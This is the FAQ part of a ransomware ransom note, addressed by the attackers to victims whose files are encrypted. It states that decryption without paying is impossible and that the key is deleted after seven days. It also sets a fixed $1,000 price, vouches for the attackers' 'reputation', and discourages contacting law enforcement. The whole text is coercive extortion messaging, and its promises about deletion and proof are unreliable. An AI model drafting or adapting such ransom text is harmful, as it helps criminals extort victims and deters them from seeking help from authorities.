                        FREQUENTLY ASKED QUESTIONS
================================================================================

Q: Can I decrypt files without paying?
A: No. The encryption uses RSA-4096 + AES-256. Breaking this would take
   billions of years with current technology.

Q: What if I don't pay?
A: Your files remain encrypted forever. We delete the decryption key after
   7 days. Recovery becomes impossible.

Q: Can I trust you?
A: We are professionals. Our reputation depends on successful decryptions.
   We have successfully decrypted files for 100+ organizations.

Q: Will you delete my data after payment?
A: Yes. We provide cryptographic proof of deletion upon request.

Q: Can I negotiate the price?
A: The price is fixed at $1,000 USD. This is already significantly lower
   than typical ransomware demands.

Q: What about law enforcement?
A: Contacting authorities will not help decrypt your files. Only we have
   the decryption key. We recommend focusing on recovery.

================================================================================
